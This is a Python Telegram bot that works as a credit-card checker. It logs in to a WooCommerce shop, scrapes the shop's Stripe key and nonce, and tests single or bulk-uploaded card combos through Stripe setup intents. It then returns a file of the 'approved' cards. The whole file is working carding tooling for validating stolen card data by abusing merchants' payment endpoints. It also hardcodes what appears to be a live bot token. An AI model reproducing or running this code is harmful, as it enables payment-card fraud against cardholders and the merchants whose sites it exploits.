import logging, os, re, requests, time
from telegram import Update, InputFile
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
from bs4 import BeautifulSoup
from collections import defaultdict

# Store user sessions: user_id -> site login and config
user_sessions = defaultdict(dict)
logging.basicConfig(level=logging.INFO)

# Universal headers
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Accept': '*/*',
    'Content-Type': 'application/x-www-form-urlencoded',
}

# Regex for card parsing
CARD_REGEX = re.compile(r'(\d{13,16})[|:](\d{2})[|:/](\d{2,4})[|:](\d{3,4})')

# ========= SITE LOGIN HANDLER =========
async def add_site_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = ' '.join(context.args)
    if not args or '|' not in args:
        await update.message.reply_text("Format: `/addsitelogin site|email|pass`", parse_mode='Markdown')
        return

    site, email, password = map(str.strip, args.split('|'))
    try:
        session = requests.Session()
        login_url = f'https://{site}/my-account/'
        r = session.get(login_url, headers=HEADERS)
        soup = BeautifulSoup(r.text, 'html.parser')
        nonce = soup.find('input', {'name': 'woocommerce-login-nonce'})['value']
        referer = soup.find('input', {'name': '_wp_http_referer'})['value']

        payload = {
            'username': email,
            'password': password,
            'woocommerce-login-nonce': nonce,
            '_wp_http_referer': referer,
            'login': 'Log in'
        }

        login_resp = session.post(login_url, data=payload, headers=HEADERS)
        if 'customer-logout' not in login_resp.text:
            raise Exception("Login failed.")

        # Now test stripe method detection
        setup_url = f'https://{site}/my-account/add-payment-method/'
        setup_resp = session.get(setup_url, headers=HEADERS)
        soup = BeautifulSoup(setup_resp.text, 'html.parser')
        script = soup.find('script', {'id': 'wc-stripe-upe-classic-js-extra'})

        if not script:
            raise Exception("No Stripe setup found.")

        config_text = script.string
        stripe_pk = re.search(r'"publishableKey"\s*:\s*"([^"]+)"', config_text).group(1)
        ajax_nonce = re.search(r'"createAndConfirmSetupIntentNonce"\s*:\s*"([^"]+)"', config_text).group(1)

        # Try all known payloads to auto-detect
        test_card = '4000000000000002|12|26|123'  # Declined test card
        method_type, detected = None, None

        # Create payment_method first
        card_number, mm, yy, cvv = test_card.split('|')
        r = session.post(
            'https://api.stripe.com/v1/payment_methods',
            headers={**HEADERS, 'Authorization': f'Bearer {stripe_pk}'},
            data={
                'type': 'card',
                'card[number]': card_number,
                'card[exp_month]': mm,
                'card[exp_year]': yy,
                'card[cvc]': cvv,
            }
        )
        stripe_json = r.json()
        if 'id' in stripe_json:
            pm_id = stripe_json['id']
            method_type = 'payment_method'
            payload = {
                'action': 'create_and_confirm_setup_intent',
                'wc-stripe-payment-method': pm_id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': ajax_nonce
            }

            result = session.post(f'https://{site}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent',
                                  data=payload, headers=HEADERS)
            try:
                res_json = result.json()
                status_msg = res_json.get('data', {}).get('status', 'Unknown')
                detected = f"Test result: {status_msg.upper()} ❌"
            except Exception:
                detected = "Stripe response error."

        # Store user config
        user_sessions[update.effective_user.id] = {
            'site': site,
            'email': email,
            'password': password,
            'stripe_pk': stripe_pk,
            'ajax_nonce': ajax_nonce,
            'method': method_type,
        }

        await update.message.reply_text(
            f"𝐒𝐢𝐭𝐞 𝐥𝐨𝐠𝐢𝐧 𝐜𝐫𝐞𝐝𝐞𝐧𝐭𝐢𝐚𝐥𝐬 𝐟𝐨𝐫 {site} 𝐡𝐚𝐯𝐞 𝐛𝐞𝐞𝐧 𝐬𝐚𝐯𝐞𝐝 𝐬𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲! ✅\n\n𝐓𝐞𝐬𝐭 𝐫𝐞𝐬𝐮𝐥𝐭: {detected}",
            parse_mode='HTML'
        )
    except Exception as e:
        await update.message.reply_text(f"Failed to add site login: {e}")

# ========= SINGLE COMBO CHECK =========
async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_sessions:
        await update.message.reply_text("Please add a site login first using `/addsitelogin`.", parse_mode='Markdown')
        return

    args = ' '.join(context.args)
    match = CARD_REGEX.search(args)
    if not match:
        await update.message.reply_text("Invalid card format. Use `/chk cc|mm|yy|cvv`", parse_mode='Markdown')
        return

    cc, mm, yy, cvv = match.groups()
    combo = f"{cc}|{mm}|{yy}|{cvv}"
    result = check_card(user_sessions[user_id], combo)
    await update.message.reply_text(result)

# ========= FILE CHECK =========
async def mchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_sessions:
        await update.message.reply_text("Please add a site login first using `/addsitelogin`.", parse_mode='Markdown')
        return

    if not update.message.document:
        await update.message.reply_text("Please upload a .txt file after using /mchk.")
        return

    file = await update.message.document.get_file()
    path = f"{user_id}_combos.txt"
    await file.download_to_drive(path)

    with open(path, 'r') as f:
        combos = [line.strip() for line in f if CARD_REGEX.match(line)]

    stats = {'Approved': 0, 'Declined': 0, 'Error': 0, 'Total': 0}
    approved = []

    for combo in combos:
        stats['Total'] += 1
        result = check_card(user_sessions[user_id], combo)
        if 'Approved' in result:
            stats['Approved'] += 1
            approved.append(combo)
        elif 'Declined' in result:
            stats['Declined'] += 1
        else:
            stats['Error'] += 1
        await update.message.reply_text(f"{combo} ➜ {result}")

    with open(f'{user_id}_approved.txt', 'w') as f:
        for a in approved:
            f.write(a + '\n')

    await update.message.reply_document(InputFile(f'{user_id}_approved.txt'),
                                         caption=f"✅ Done!\nTotal: {stats['Total']}\nApproved: {stats['Approved']}\nDeclined: {stats['Declined']}\nError: {stats['Error']}")

# ========= CARD CHECKING CORE =========
def check_card(config, combo):
    try:
        session = requests.Session()
        login_url = f"https://{config['site']}/my-account/"
        r = session.get(login_url, headers=HEADERS)
        soup = BeautifulSoup(r.text, 'html.parser')
        nonce = soup.find('input', {'name': 'woocommerce-login-nonce'})['value']
        referer = soup.find('input', {'name': '_wp_http_referer'})['value']
        login_data = {
            'username': config['email'],
            'password': config['password'],
            'woocommerce-login-nonce': nonce,
            '_wp_http_referer': referer,
            'login': 'Log in'
        }
        session.post(login_url, data=login_data, headers=HEADERS)

        cc, mm, yy, cvv = combo.split('|')
        r = session.post(
            'https://api.stripe.com/v1/payment_methods',
            headers={**HEADERS, 'Authorization': f'Bearer {config["stripe_pk"]}'},
            data={
                'type': 'card',
                'card[number]': cc,
                'card[exp_month]': mm,
                'card[exp_year]': yy,
                'card[cvc]': cvv,
            }
        )
        js = r.json()
        if 'error' in js:
            return f"Declined ❌ - {js['error']['message']}"

        pm_id = js['id']
        payload = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pm_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': config['ajax_nonce']
        }
        r = session.post(f"https://{config['site']}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", data=payload)
        js = r.json()
        status = js.get('data', {}).get('status')
        if status == 'succeeded':
            return f"Approved ✅"
        else:
            return f"Declined ❌ - Status: {status or 'Unknown'}"
    except Exception as e:
        return f"Error ⚠️ - {e}"

# ========= MAIN =========
if __name__ == '__main__':
    app = ApplicationBuilder().token("7615802418:AAFmsHTQP7_2iNEve7-aa6A6LNA4V2GfuDs").build()
    app.add_handler(CommandHandler("addsitelogin", add_site_login))
    app.add_handler(CommandHandler("chk", chk))
    app.add_handler(CommandHandler("mchk", mchk))
    app.add_handler(MessageHandler(filters.Document.FILE_EXTENSION("txt"), mchk))
    print("Bot is running...")
    app.run_polling()
